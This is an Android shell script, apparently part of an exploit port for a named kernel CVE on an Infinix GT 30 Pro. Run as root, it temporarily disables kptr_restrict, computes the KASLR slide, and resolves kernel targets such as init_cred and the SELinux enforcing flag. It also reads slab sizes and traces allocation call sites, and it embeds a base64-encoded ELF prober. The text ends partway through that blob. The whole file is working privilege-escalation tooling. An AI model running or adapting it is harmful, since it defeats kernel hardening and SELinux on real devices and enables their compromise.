#!/system/bin/sh
# derive-consts.sh — Infinix GT 30 Pro (X6873) on-device constants
# derivation for the Shark CVE-2026-98260 port.
#
# Run as root on the target device (temporary root is fine, e.g. right
# after a GhostLock session, before rebooting):
#
#     adb push ports/x6873/tools/derive-consts.sh /data/local/tmp/
#     adb shell
#     su
#     sh /data/local/tmp/derive-consts.sh
#
# v4 (2026-11-12 night, after the second real-device run):
#   - v3 pinned the KASLR slide correctly (int32 fix verified on
#     device: 3 anchors agreed, slide 2MiB-aligned) but died at
#     "no call site within 16 KiB of do_timer_create": the assumption
#     that the posix-timer alloc site sits inside do_timer_create was
#     WRONG. Cross-boot analysis of the 19:58 bundle runtime sites
#     (funnel 0xffffffe0d2d9feb0, copy 0xffffffe0d2aac148 -> linked
#     delta L_t - L_c = 0x2F3D68) plus this build's do_timer_create
#     (0x193258, boot-invariant) rules the k=0 timer candidate out
#     entirely; the consistent combo is funnel=0x39feb0 (k=1, 2 MiB
#     above do_timer_create - LTO/GKI function reordering) with the
#     fork.c copy site at 0xac148 (k=0). v4 drops the proximity
#     assumption completely.
#   - Site resolution is a ladder, fail-closed at every step:
#       (1) TRACE (primary): a trace record for the cache size gives
#           the exact call site - symbol form resolved against the
#           kallsyms copy, hex form via the pinned slide. The low21
#           must match the bundle-baked value (build identity gate).
#       (2) KALLSYMS ENCLOSING (fallback): candidates low21 + k*2MiB
#           inside [_text,_etext]; for each, the enclosing function is
#           found from the copy; a site is accepted ONLY when exactly
#           one candidate's enclosing symbol matches the known family
#           (timer: *timer_create*/*posix_timer*/*alloc_posix*;
#           copy: *dup_task*/*copy_process*/*alloc_task*/*task_struct*).
#           Ambiguous or empty -> abort with a full candidate dump.
#   - The embedded prober is best-effort only: it failed on both device
#     runs with a bare PROBE_TIMER_FAIL (no errno compiled in; no cross
#     toolchain available to rebuild it). On failure v4 dumps probe.out
#     inline and opens a PASSIVE 3 s trace window with forced fork
#     churn from the script itself (subshell/ls forks produce the task
#     records; system timer_create activity produces the timer records
#     - the 19:58 bundle saw 139 timer allocs from 15 pids in seconds).
#   - All kallsyms-only outputs (slide, do_timer_create/dup_task_struct
#     offsets, the five data symbols, selinux delta) are printed EARLY,
#     so even a later abort leaves a fully usable console.
#   - kallsyms is COPIED to the workdir inside the lifted kptr window
#     (one cat); every pass (wanted symbols, enclosing scan, trace
#     symbol lookups) runs on the copy, keeping the lift window minimal.
#
# v3 (kept from the first device run): mksh evaluates $(( )) in 32-bit
#   signed ints - the 2^32 literal wrapped to 0 ("zero divisor") and
#   the empty slides then compared EQUAL (fail-open). v3+ keeps every
#   value as a signed int32 representative of its mod-2^32 class, uses
#   no 2^32 literal anywhere (grep-audited) and validates every derived
#   value with is_int() before use.
#
# Portability: pure shell (mksh/toybox/dash/bash); grep/tail from
# toybox are used for the kallsyms passes; no awk/sed/cut/python.
# Sandbox mock shells compute in 64-bit ints and cannot catch 32-bit
# overflow - that class is covered by the python int32 model audit in
# the offline harness.
#
# Nothing is written anywhere outside /data/local/tmp/x6873_derive
# (kept when the prober fails or any fallback path is taken, so the
# kallsyms copy + probe.out can be sent back; delete manually after).

RELEASE="6.1.157-android14-11-ga8b0b542991e-ab15601211"

# Port base frame — see ports/x6873/README.md. Only internal consistency
# matters (the engine slide cancels a constant shift), but we keep the
# same 0xffffffc080000000 frame as the other Shark GKI ports.
BASE_HI_HEX=ffffffc0
BASE_LO=0x80000000

# GhostLock-measured kernel image offsets for this exact release.
A_INIT_TASK=0x201f640
A_INIT_CRED=0x2031aa8
A_ROOT_TASK_GROUP=0x2209980
A_SELINUX_ENFORCING=0x225b820

# Baked from the 2026-11-12 probe bundle (see K61157_plant.c provenance).
BAKED_TIMER_LOW21=$(( 0x19feb0 ))
BAKED_COPY_LOW21=$(( 0xac148 ))
BAKED_TIMER_REQ=$(( 0x108 ));  BAKED_TIMER_ALLOC=$(( 0x140 ))
BAKED_CRED_REQ=$(( 0xb0 ));    BAKED_CRED_ALLOC=$(( 0xc0 ))
BAKED_TASK_REQ=$(( 0x12c0 ));  BAKED_TASK_ALLOC=$(( 0x12c0 ))

WORK="${X6873_WORK:-/data/local/tmp/x6873_derive}"
KS="${X6873_KALLSYMS:-/proc/kallsyms}"
SLABINFO="${X6873_SLABINFO:-/proc/slabinfo}"
KPTR_FILE="${X6873_KPTR:-/proc/sys/kernel/kptr_restrict}"
TR="${X6873_TRACEFS:-}"
UNAME_R="${X6873_RELEASE:-$(uname -r)}"
PROBE_BIN="${X6873_PROBE:-}"          # test hook: use a mock prober
ALLOW_NONROOT="${X6873_ALLOW_NONROOT:-}"  # test hook only

say() { printf '%s\n' "$*"; }
die() {
    printf 'ERROR: %s\n' "$*" >&2
    printf 'DERIVATION ABORTED — nothing usable was printed.\n' >&2
    exit 1
}

# ---- int32 discipline: every arithmetic value is a signed 32-bit
# representative of a mod-2^32 quantity (signed equality == modular
# equality). No 2^32 literal anywhere (offline grep audit).
is_int() {
    case "$1" in
    "")  return 1 ;;
    -)   return 1 ;;
    -*)  case "${1#-}" in *[!0-9]*) return 1 ;; esac ;;
    *)   case "$1"     in *[!0-9]*) return 1 ;; esac ;;
    esac
    return 0
}

# addresses are 16 hex digits (arm64); lo = last 8.
addr_lo() { h=$1; while [ ${#h} -lt 8 ]; do h="0$h"; done; printf '%s' "$h" | tail -c 8; }

# ---------------------------------------------------------------- 1. env
if [ "$(id -u)" != "0" ] && [ -z "$ALLOW_NONROOT" ]; then
    die "run as root: su -c 'sh $0'"
fi
[ "$UNAME_R" = "$RELEASE" ] || die "uname -r '$UNAME_R' != target '$RELEASE'"
[ -r "$KS" ] || die "$KS is not readable (need root)"
[ -r "$SLABINFO" ] || die "$SLABINFO is not readable (need root)"

if [ -z "$TR" ]; then
    if [ -d /sys/kernel/tracing ]; then TR=/sys/kernel/tracing
    elif [ -d /sys/kernel/debug/tracing ]; then TR=/sys/kernel/debug/tracing
    else TR=""; fi
fi
[ -n "$TR" ] || die "no tracefs found (/sys/kernel/tracing, /sys/kernel/debug/tracing)"

rm -rf "$WORK" 2>/dev/null
mkdir -p "$WORK" || die "cannot create $WORK"
KSCOPY="$WORK/kallsyms.txt"

EVT="$TR/events/kmem/kmem_cache_alloc/enable"
EVT_NODE="$TR/events/kmem/kmem_cache_alloc_node/enable"

# kptr_restrict=2 zeroes kallsyms for EVERY reader, uid 0 included
# (probe bundle 2026-11-12: root kallsyms 0/14 visible). Real addresses
# are mandatory; lift the sysctl as root just for the copy and restore
# immediately (trap-guarded).
KPTR_SAVED=""
kptr_restore() {
    if [ -n "$KPTR_SAVED" ]; then
        printf '%s' "$KPTR_SAVED" > "$KPTR_FILE" 2>/dev/null
        KPTR_SAVED=""
    fi
    return 0
}

# tracefs state (touched only by the trace window)
T_ON_SAVED=""; T_BUF_SAVED=""; T_E1_SAVED=""; T_E2_SAVED=""
trace_restore() {
    [ -z "$T_ON_SAVED" ]  || printf '%s' "$T_ON_SAVED"  > "$TR/tracing_on" 2>/dev/null
    [ -z "$T_BUF_SAVED" ] || printf '%s' "$T_BUF_SAVED" > "$TR/buffer_size_kb" 2>/dev/null
    [ -z "$T_E1_SAVED" ]  || printf '%s' "$T_E1_SAVED"  > "$EVT" 2>/dev/null
    [ -z "$T_E2_SAVED" ]  || printf '%s' "$T_E2_SAVED"  > "$EVT_NODE" 2>/dev/null
    return 0
}
cleanup() { kptr_restore; trace_restore; }
trap 'cleanup' EXIT

# ---------------------------------------------- 2. kallsyms copy (+ lift)
cat "$KS" > "$KSCOPY" 2>/dev/null || die "cannot read $KS"

WANTED_RE=' (init_task|init_cred|root_task_group|selinux_state|panic_on_warn|root_user|init_user_ns|init_ucounts|init_groups|do_timer_create|dup_task_struct|_text|_etext)$'

read_wanted() { # sets RT_<name> (last match wins) from the copy
    _got="$(grep -E "$WANTED_RE" "$KSCOPY" 2>/dev/null)" || true
    while read -r a t n rest; do
        [ -n "$n" ] || continue
        eval "RT_$n=\$a"
    done <<EOF
$_got
EOF
    return 0
}

zero_addr() {
    case "$1" in
    "" | 0000000000000000) return 0 ;;
    esac
    return 1
}

read_wanted
if zero_addr "$RT_init_task"; then
    [ "$(id -u)" = "0" ] || \
        die "kallsyms addresses are hidden (kptr_restrict) and not root - run under su (PATH B)"
    [ -r "$KPTR_FILE" ] || die "$KPTR_FILE is not readable"
    KPTR_SAVED=$(cat "$KPTR_FILE" 2>/dev/null)
    printf '%s' 0 > "$KPTR_FILE" 2>/dev/null || \
        die "cannot write $KPTR_FILE (SELinux or sysctl lockdown from this context)"
    cat "$KS" > "$KSCOPY" 2>/dev/null
    read_wanted
    if zero_addr "$RT_init_task"; then
        kptr_restore
        die "kallsyms still zeroed with kptr_restrict=0 - unexpected lockdown"
    fi
    say "[ok] kptr_restrict lifted ($KPTR_SAVED -> 0) for the kallsyms copy"
fi
kptr_restore

for _a in init_task init_cred root_task_group do_timer_create dup_task_struct; do
    eval "_v=\$RT_$_a"
    if zero_addr "$_v"; then
        die "kallsyms symbol $_a has no real address (got '${_v:-empty}') - refusing to derive"
    fi
done

# ------------------------------------------------- 3. slide + early facts
slide_of() { # $1 = runtime hex, $2 = image offset -> signed int32 rep
    rt_lo=$(( 0x$(addr_lo "$1") ))
    lk_lo=$(( BASE_LO + $2 ))
    echo $(( rt_lo - lk_lo ))
}
S1=$(slide_of "$RT_init_task" "$A_INIT_TASK")
S2=$(slide_of "$RT_init_cred" "$A_INIT_CRED")
S3=$(slide_of "$RT_root_task_group" "$A_ROOT_TASK_GROUP")
for _s in "$S1" "$S2" "$S3"; do
    is_int "$_s" || die "slide anchor produced no value (arithmetic failed) - report this output"
done
if [ "$S1" != "$S2" ] || [ "$S2" != "$S3" ]; then
    die "slide anchors disagree ($S1 / $S2 / $S3) — kernel build does not match the GhostLock profile"
fi
SLIDE=$S1
if [ $(( SLIDE & 0x1fffff )) -ne 0 ]; then
    say "[warn] slide $SLIDE is not 2MiB-aligned (arm64 KASLR normally is) - check the anchors"
fi
say "[ok] release matched: $UNAME_R"
say "[ok] KASLR slide pinned from 3 anchors (signed int32, port frame): $SLIDE"

# loff: runtime hex -> linked image offset [0, 1GiB)
loff() { # $1 = runtime hex
    v=$(( 0x$(addr_lo "$1") - SLIDE - BASE_LO ))
    is_int "$v" || return 1
    if [ "$v" -ge 0 ] && [ "$v" -lt 1073741824 ]; then
        echo "$v"
        return 0
    fi
    return 1
}

# hexaddr: linked offset -> 0xffffffc0_8xxxxxxx string, digit-wise (no
# printf %x on values that may be negative in int32 shells).
hexaddr() { # $1 = linked offset
    o=$(( $1 + 0 ))
    d=$(( o / 268435456 ))
    r=$(( o % 268435456 ))
    printf '0x%s%x%07x' "$BASE_HI_HEX" $(( d + 8 )) "$r"
}

sxoff() { # small signed decimal -> "+0x.." / "-0x.."
    if [ "$1" -lt 0 ]; then printf -- '-0x%x' $(( 0 - $1 ))
    else printf '+0x%x' "$1"; fi
}

# hex32: int32 value -> 8 lowercase hex digits (two's complement), via
# normalized divmod so negative values never hit printf %x
hex32() { # $1 = int32 value
    v=$(( $1 + 0 ))
    out=""
    i=0
    while [ "$i" -lt 8 ]; do
        d=$(( v % 16 ))
        [ "$d" -lt 0 ] && d=$(( d + 16 ))
        v=$(( ( v - d ) / 16 ))
        case "$d" in
        10) c=a ;; 11) c=b ;; 12) c=c ;; 13) c=d ;; 14) c=e ;; 15) c=f ;;
        *)  c="$d" ;;
        esac
        out="$c$out"
        i=$(( i + 1 ))
    done
    printf '%s' "$out"
}

# runtime hex16 of a linked offset, anchored on do_timer_create's
# runtime address (delta is small; int32 wrap + 32-bit-boundary carry
# handled explicitly — |delta| < 2^27 by construction)
RT_DTC_LO=""; RT_DTC_HI=0
rt_hex16() { # $1 = linked offset -> 16-char runtime hex
    delta=$(( $1 - D_TIMER ))
    sum=$(( RT_DTC_LO + delta ))
    hi=$RT_DTC_HI
    if [ "$RT_DTC_LO" -ge 0 ] && [ "$sum" -lt 0 ] && [ "$RT_DTC_LO" -lt 134217728 ]; then
        hi=$(( hi - 1 ))                       # borrow below 0
    fi
    if [ "$RT_DTC_LO" -lt 0 ] && [ "$sum" -ge 0 ] && [ "$RT_DTC_LO" -ge -134217728 ]; then
        hi=$(( hi + 1 ))                       # carry past 2^32
    fi
    printf '%s%s' "$(hex32 "$hi")" "$(hex32 "$sum")"
}

# text bounds for candidate filtering
TEXT_LO=$(loff "$RT__text" 2>/dev/null) || TEXT_LO=""
TEXT_HI=$(loff "$RT__etext" 2>/dev/null) || TEXT_HI=""
if [ -n "$TEXT_LO" ] && [ -n "$TEXT_HI" ] && [ "$TEXT_HI" -gt "$TEXT_LO" ]; then
    say "[ok] text window: $(hexaddr "$TEXT_LO") .. $(hexaddr "$TEXT_HI")"
else
    TEXT_LO=$(( 0x10000 )); TEXT_HI=$(( 22020160 ))
    say "[warn] _text/_etext not resolvable - candidate window falls back to 0x10000..0x1500000"
fi

D_TIMER=$(loff "$RT_do_timer_create") || die "do_timer_create resolves outside the port frame - unexpected"
D_COPY=$(loff "$RT_dup_task_struct") || die "dup_task_struct resolves outside the port frame - unexpected"
RT_DTC_LO=$(( 0x$(addr_lo "$RT_do_timer_create") ))
RT_DTC_HI=$(( 0x$(printf '%s' "$RT_do_timer_create" | head -c 8) ))
say "[ok] do_timer_create : $(hexaddr "$D_TIMER")"
say "[ok] dup_task_struct : $(hexaddr "$D_COPY")"

emit_sym() { # $1 = RT_ variable name -> port-frame hex or 0x0
    eval "v=\$RT_$1"
    if [ -n "$v" ]; then
        o=$(loff "$v") && { hexaddr "$o"; return 0; }
    fi
    echo "0x0"
}

PENDING_SYMS=""
for s in panic_on_warn root_user init_user_ns init_ucounts init_groups; do
    eval "v=\$RT_$s"
    [ -n "$v" ] || PENDING_SYMS="$PENDING_SYMS $s"
done

# early partial output: everything kallsyms-only, so a later abort still
# leaves a usable console
say "---- kallsyms-only constants (valid regardless of the site resolution below) ----"
say "panic_on_warn : $(emit_sym panic_on_warn)"
say "root_user     : $(emit_sym root_user)"
say "init_user_ns  : $(emit_sym init_user_ns)"
say "init_ucounts  : $(emit_sym init_ucounts)"
say "init_groups   : $(emit_sym init_groups)"
if [ -n "$PENDING_SYMS" ]; then
    say "[warn] kallsyms lacks data symbols:$PENDING_SYMS - they stay PENDING"
fi
if [ -n "$RT_selinux_state" ]; then
    SEL_OFF=$(loff "$RT_selinux_state") || SEL_OFF=""
    if [ -n "$SEL_OFF" ]; then
        SEL_DELTA=$(( SEL_OFF - A_SELINUX_ENFORCING ))
        say "[info] selinux_state symbol $(hexaddr "$SEL_OFF") vs measured enforcing offset 0x225b820: delta $(sxoff "$SEL_DELTA") (small = enforcing near struct start; the plant constant uses the measured address)"
        if [ "$SEL_DELTA" -lt -256 ] || [ "$SEL_DELTA" -gt 256 ]; then
            say "[warn] selinux delta is large - double-check before trusting the prefilled constant"
        fi
    fi
else
    say "[info] selinux_state not in kallsyms - cross-check skipped (prefilled constant stands)"
fi

# ------------------------------------------------------ 4. slab geometry
slabsize() { # $1 = cache name -> objsize
    while read -r name rest; do
        [ "$name" = "$1" ] || continue
        set -- $name $rest
        echo "$4"
        return 0
    done < "$SLABINFO"
    return 1
}
SZ_TIMER=$(slabsize posix_timers_cache) || die "slabinfo has no posix_timers_cache row"
SZ_CRED=$(slabsize cred_jar) || die "slabinfo has no cred_jar row"
SZ_TASK=$(slabsize task_struct) || die "slabinfo has no task_struct row"
say "[ok] slab sizes: posix_timers_cache=$SZ_TIMER cred_jar=$SZ_CRED task_struct=$SZ_TASK"
slab_match() { # $1 slabinfo objsize, $2 baked req, $3 baked alloc
    [ "$1" = "$2" ] && return 0
    [ "$1" = "$3" ] && return 0
    return 1
}
slab_match "$SZ_TIMER" "$BAKED_TIMER_REQ" "$BAKED_TIMER_ALLOC" || say "[warn] posix_timers_cache objsize $SZ_TIMER differs from bundle 0x108/0x140"
slab_match "$SZ_CRED" "$BAKED_CRED_REQ" "$BAKED_CRED_ALLOC" || say "[warn] cred_jar objsize $SZ_CRED differs from bundle 0xb0/0xc0"
slab_match "$SZ_TASK" "$BAKED_TASK_REQ" "$BAKED_TASK_ALLOC" || say "[warn] task_struct objsize $SZ_TASK differs from bundle 0x12c0/0x12c0"

# ---------------------------------------------------- 5. trace window
TRACE_AVAILABLE=1
if [ ! -f "$EVT" ] || [ ! -w "$EVT" ]; then
    TRACE_AVAILABLE=0
    say "[warn] $EVT missing or not writable — trace window skipped (kallsyms fallback only)"
fi

# symbol/hex call_site token -> linked offset (uses the copy + slide).
# Device forms: "sym+0xNN/0xMM" (symbolized), "0x..." or bare 16-hex
# ("ffffffc0d2d9feb0" — kernel pointer printing carries no 0x prefix).
resolve_token() { # $1 = token
    cs=$1
    case "$cs" in
    "" | 0000000000000000) return 1 ;;
    0x*)
        loff "${cs#0x}"
        return $?
        ;;
    *)
        sn=${cs%%+*}
        so=0
        case "$cs" in
        *+*)
            so=${cs##*+}; so=${so%%/*}
            case "$so" in
            0x*) so=$(( so )) ;;
            *)   return 1 ;;
            esac
            ;;
        esac
        case "$sn" in
        "" | *[!A-Za-z0-9_.]*) ;;
        *)
            line="$(grep -E " $sn\$" "$KSCOPY" 2>/dev/null | tail -n 1)" || line=""
            if [ -n "$line" ]; then
                set -- $line
                rs=$1
                v=$(( 0x$(addr_lo "$rs") + so - SLIDE - BASE_LO ))
                is_int "$v" || return 1
                if [ "$v" -ge 0 ] && [ "$v" -lt 1073741824 ]; then
                    echo "$v"
                    return 0
                fi
                return 1
            fi
            ;;
        esac
        # not a known symbol: bare 16-hex kernel address (f + 15 digits)?
        case "$cs" in
        f???????????????)
            case "$cs" in
            *[!0-9a-f]*) return 1 ;;
            esac
            loff "$cs"
            return $?
            ;;
        esac
        return 1
        ;;
    esac
}

# find_rec SIZE -> "token bytes_alloc" for the first kmem_cache_alloc(_node)
# record with bytes_req=SIZE whose call_site is not zeroed; "ZEROED" if
# only zeroed call_sites were seen for this size.
find_rec() {
    want_sz=$1
    saw_zero=0
    while IFS= read -r line; do
        case "$line" in
        *"kmem_cache_alloc"*"call_site="*"bytes_req=$want_sz "*) ;;
        *) continue ;;
        esac
        cs=""; alloc=""
        for w in $line; do
            case "$w" in
            call_site=*)   cs=${w#call_site=} ;;
            bytes_alloc=*) alloc=${w#bytes_alloc=} ;;
            esac
        done
        [ -n "$cs" ] || continue
        case "$cs" in
        0x0000000000000000) saw_zero=1; continue ;;
        esac
        printf '%s %s\n' "$cs" "$alloc"
        return 0
    done < "$TR/trace"
    [ "$saw_zero" = "1" ] && { echo "ZEROED"; return 0; }
    return 1
}

PROBER_OK=0
TIMER_TOKEN=""; TIMER_ALLOC_V=""
TASK_TOKEN="";  TASK_ALLOC_V=""

collect_recs() { # sets tokens/allocs + COLLECTED (global); NEVER call it in a
                   # command substitution - the token assignments would be lost
                   # with the subshell (bug caught by the mock harness)
    COLLECTED=0
    r=$(find_rec "$SZ_TIMER") && { [ "$r" = "ZEROED" ] || { TIMER_TOKEN=${r% *}; TIMER_ALLOC_V=${r#* }; COLLECTED=$(( COLLECTED + 1 )); }; } || true
    r=$(find_rec "$SZ_TASK")  && { [ "$r" = "ZEROED" ] || { TASK_TOKEN=${r% *};  TASK_ALLOC_V=${r#* };  COLLECTED=$(( COLLECTED + 1 )); }; } || true
    return 0
}

if [ "$TRACE_AVAILABLE" = "1" ]; then
    # tracefs state save
    [ -f "$TR/tracing_on" ] && { T_ON_SAVED=$(cat "$TR/tracing_on" 2>/dev/null); T_BUF_SAVED=$(cat "$TR/buffer_size_kb" 2>/dev/null); }
    [ -f "$EVT" ]      && T_E1_SAVED=$(cat "$EVT" 2>/dev/null)
    [ -f "$EVT_NODE" ] && T_E2_SAVED=$(cat "$EVT_NODE" 2>/dev/null)

    # (a) embedded prober, best effort
    if [ -z "$PROBE_BIN" ]; then
        printf '%s' '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